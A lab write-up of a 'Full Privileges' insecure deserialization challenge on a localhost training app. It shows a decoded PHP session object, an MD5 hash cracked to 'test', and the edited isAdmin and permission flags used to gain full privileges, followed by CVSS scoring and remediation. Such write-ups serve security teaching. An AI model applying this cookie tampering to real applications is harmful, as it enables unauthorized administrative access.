# Privilege Escalation

### Vulnerability : Insecure Deserialization – Privilege Escalation

***

#### 1. Vulnerability Name & Description

**Challenge Name:** Full Privileges

**Vulnerability Type:** Insecure Deserialization (PHP Object Injection)

The application uses **Base64 + URL encoded serialized PHP objects** inside client-side cookies to store authentication and authorization data, including user permissions.

The server blindly decodes and unserializes this data without integrity checks or validation.

An attacker can modify the serialized object to escalate privileges by enabling restricted permissions such as **Add, Update, and Delete**, resulting in **full administrative access**.

***

#### 2. Proof of Concept (PoC)

**Vulnerable Endpoint:**

```
<http://localhost:1337/lab/insecure-deserialization/full-privileges/index.php>
```

**Vulnerable Component:**

* Session cookie containing serialized PHP object

***

#### 3. Exploitation Steps

***

#### Step 1: Login as Normal User

**Credentials Used:**

```
Username:test
Password:test
```

After login, the application shows restricted permissions:

```
Delete :No
Update :No
Add    :No
```

***

#### Step 2: Extract Session Cookie

Using browser Developer Tools:

* Open **Storage → Cookies**
* Copy the session cookie value
* Cookie value is **Base64 + URL encoded**

***

#### Step 3: Decode Cookie Value

Using **CyberChef**:

* From Base64
* URL Decode

Decoded output reveals a **serialized PHP object**:

```php
O:4:"User":4:{
  s:8:"username";s:32:"098f6bcd4621d373cade4e832627b4f6";
  s:8:"password";s:32:"098f6bcd4621d373cade4e832627b4f6";
  s:7:"isAdmin";i:0;
  s:11:"permissions";O:10:"Permission":3:{
    s:9:"canDelete";i:0;
    s:9:"canUpdate";i:0;
    s:6:"canAdd";i:0;
  }
}
```

***

#### Step 4: Crack Hashed Credentials

The MD5 hash found in the object is cracked using **CrackStation**:

```
098f6bcd4621d373cade4e832627b4f6 →test
```

This confirms weak hashing and predictable credentials.

***

#### Step 5: Modify Serialized Object (Privilege Escalation)

The serialized object is modified:

* `isAdmin` → `1`
* Permissions updated:

```php
s:9:"canDelete";i:1;
s:9:"canUpdate";i:1;
s:6:"canAdd";i:1;
```

***

#### Step 6: Re-encode Payload

Using **CyberChef**:

* To Base64
* URL Encode

***

#### Step 7: Replace Cookie & Refresh Page

* Replace original cookie with modified payload
* Refresh the page

***

#### Step 8: Full Privileges Granted

The application now displays:

```
Delete :Yes
Update :Yes
Add    :Yes
Youhavealltheprivileges
```

Confirms **successful privilege escalation**.

***

#### 4. Impact Analysis

* Unauthorized privilege escalation
* Bypass of authorization controls
* Full administrative access
* Ability to modify, delete, and add protected resources
* Potential data integrity loss
* Complete trust boundary violation

***

#### 5. CVSS 3.1 Score & Vector String

**CVSS Base Score:** 9.1 (Critical)

**Vector String:**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
```

***

#### 6. Risk Rating / Severity

**Severity Level:** **CRITICAL**

Client-side manipulation of serialized objects leads directly to full privilege escalation.

***

#### 7. Remediation / Mitigation Steps

1. Never store authorization data client-side
2. Avoid PHP `serialize()` / `unserialize()` on user input
3. Store session & permissions server-side only
4. Use signed and encrypted session tokens
5. Implement role-based access control (RBAC) on server
6. Use secure password hashing (bcrypt / Argon2)
7. Validate and enforce permissions server-side

***

#### 8. Screenshots / Evidence

<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

* Login with restricted user

<figure><img src="../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

* Session cookie extraction

<figure><img src="../../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

* Decoded serialized object

<figure><img src="../../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

* Cracked MD5 hash

<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

* Create administrator MD5 Hash For Admin Login

<figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

* Modified permission flags
* Re-encoded cookie

<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

* Paste The encoded cookie and refresh the Page

<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

* Full privileges enabled

